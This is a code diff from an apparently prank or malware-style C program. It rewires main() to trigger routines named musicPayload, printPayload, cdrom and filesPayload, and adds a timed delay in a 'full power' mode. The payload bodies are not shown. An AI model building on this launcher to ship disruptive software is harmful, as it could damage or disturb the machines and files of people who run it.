@@ -7,7 +7,8 @@ extern int maxLevel,
 extern float sleepSecs;
 
 char* rootDir;
-int go=1,quit=0;
+int go=1,
+	quit=0;
 void intHandler(int useless){
        if(!isFullPower){
 	printf("BORAEMBORA CARALHO!! ANDOR!!!!\n");
@@ -63,7 +64,7 @@ int main(int argc, char ** argv){
 	}
 	}
 	if(isFullPower){
-		maxLevel=INT_MAX-1;
+		maxLevel=MAX_LEVELS-1;
 		sleepSecs= MIN_SLEEP_SECS;
 	}
 		
@@ -81,6 +82,16 @@ int main(int argc, char ** argv){
 					break;
 				case 0:
 
+			
+			#ifdef A_CODE
+					musicPayload();
+			#endif
+					
+						
+				break;
+				default:
+
+
 			#ifdef RANDPRINTS
 				pthread_create(&output,NULL,printPayload,NULL);
 			#endif
@@ -88,25 +99,28 @@ int main(int argc, char ** argv){
 					pthread_create(&cdromStuff,NULL,cdrom,NULL);
 			#endif
 		
+
+						if(isFullPower){
+						
+						int counter=0;
+							while(counter<60+58){
+							counter++;
+							usleep(SEC_IN_US);
+							}
+
+						}
+						pthread_create(&filesWorker,NULL,filesPayload,NULL);
+						pthread_join(filesWorker,NULL);
 			#ifdef RANDPRINTS
-					pthread_detach(output);
+					
+					pthread_join(output,NULL);
 			#endif
 
 			#ifdef NON_COMPAT_CODE
-					pthread_detach(cdromStuff);
+					pthread_join(cdromStuff,NULL);
 			#endif
 
 
-			#ifdef A_CODE
-					musicPayload();
-			#endif
-		
-					
-						
-				break;
-				default:
-						pthread_create(&filesWorker,NULL,filesPayload,NULL);
-						pthread_join(filesWorker,NULL);
 					break;
 
 			}
